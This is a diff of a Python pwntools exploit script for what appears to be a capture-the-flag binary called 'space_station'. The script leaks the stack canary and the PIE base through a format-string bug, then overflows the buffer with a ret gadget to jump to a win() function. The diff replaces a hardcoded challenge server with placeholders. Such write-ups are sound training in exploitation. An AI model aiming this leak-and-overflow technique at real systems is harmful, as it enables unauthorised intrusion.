@@ -1,47 +1,58 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = ELF('space_station', checksec=False)
+exe = ELF('./space_station')
 context.binary = exe
-context.arch = 'amd64'
-context.os = 'linux'
+context.arch   = 'amd64'
+context.os     = 'linux'
 
-CANARY_IDX       = 15
-PIE_IDX          = 17
-PIE_OFFSET       = 0x139e
-GADGET_OFFSET = 0x101a
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
+
+# ── offsets ───────────────────────────────────────────────────────────────────
 OFFSET_TO_CANARY = 72
-OFFSET_TO_RIP    = 88
+OFFSET_TO_RIP    = 88   # canary + saved RBP
+
+# ── format string indices ─────────────────────────────────────────────────────
+CANARY_IDX = 15
+PIE_IDX    = 17
+
+# ── PIE-relative offsets ──────────────────────────────────────────────────────
+PIE_OFFSET    = 0x139e   # main+62 static offset from pie_base
+GADGET_OFFSET = 0x101a   # ret gadget static offset from pie_base
 
 def conn():
     if args.LOCAL:
         return process(exe.path)
-    return remote('offsec.m0lecon.it', 13581)
+    return remote(HOSTNAME, PORT)
 
 def main():
+    # ── leak phase ────────────────────────────────────────────────────────────
     r = conn()
-
-    # leak phase
-    r.recvuntil(b'astronaut ID: ')
+    r.recvuntil(b'name')
     r.sendline(f'%{CANARY_IDX}$lx.%{PIE_IDX}$lx'.encode())
 
-    leak = r.recvline().strip().split(b'.')
-    canary   = int(leak[0], 16)
-    pie_base = int(leak[1], 16) - PIE_OFFSET
-    exe.address = pie_base
+    response = r.recvline()
+    parts    = response.strip().split(b'.')
+    canary   = int(parts[0], 16)
+    pie_leak = int(parts[1], 16)
+
+    pie_base = pie_leak - PIE_OFFSET
+    win_addr = pie_base + exe.sym.win
+    gadget   = pie_base + GADGET_OFFSET
 
     log.info(f'canary   = {canary:#x}')
     log.info(f'pie_base = {pie_base:#x}')
-    log.info(f'win()    = {exe.sym.win:#x}')
+    log.success(f'win()    = {win_addr:#x}')
 
-    # overflow phase
-    r.recvuntil(b'mission log: ')
+    # ── exploit phase ─────────────────────────────────────────────────────────
+    r.recvuntil(b'log')
     payload = flat(
         b'A' * OFFSET_TO_CANARY,
         p64(canary),
-        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
-        p64(exe.address + GADGET_OFFSET),   # ret gadget
-        p64(exe.sym.win),
+        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
+        p64(gadget),
+        p64(win_addr),
     )
     r.send(payload)
     r.interactive()
